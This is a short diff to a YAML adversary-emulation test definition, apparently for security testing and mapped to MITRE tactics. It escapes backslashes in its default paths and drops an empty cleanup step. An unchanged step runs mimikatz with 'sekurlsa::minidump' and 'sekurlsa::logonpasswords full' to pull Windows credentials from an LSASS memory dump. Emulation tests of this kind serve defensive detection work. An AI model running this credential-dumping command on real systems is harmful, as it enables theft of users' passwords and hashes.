@@ -6,10 +6,10 @@ description: |
 args:
     - name: input_file
       type: path
-      default: '%tmp%\lsass.DMP'
+      default: '%tmp%\\lsass.DMP'
     - name: mimikatz_exe
       type: string
-      default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe
+      default: PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe
 uuid: 453acf13-1dbd-47d7-b28a-172ce9228023
 mitre:
     tactics:
@@ -36,6 +36,3 @@ steps:
       inline: |
         "{{.Args.mimikatz_exe}}" "sekurlsa::minidump {{.Args.input_file}}" "sekurlsa::logonpasswords full" exit
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
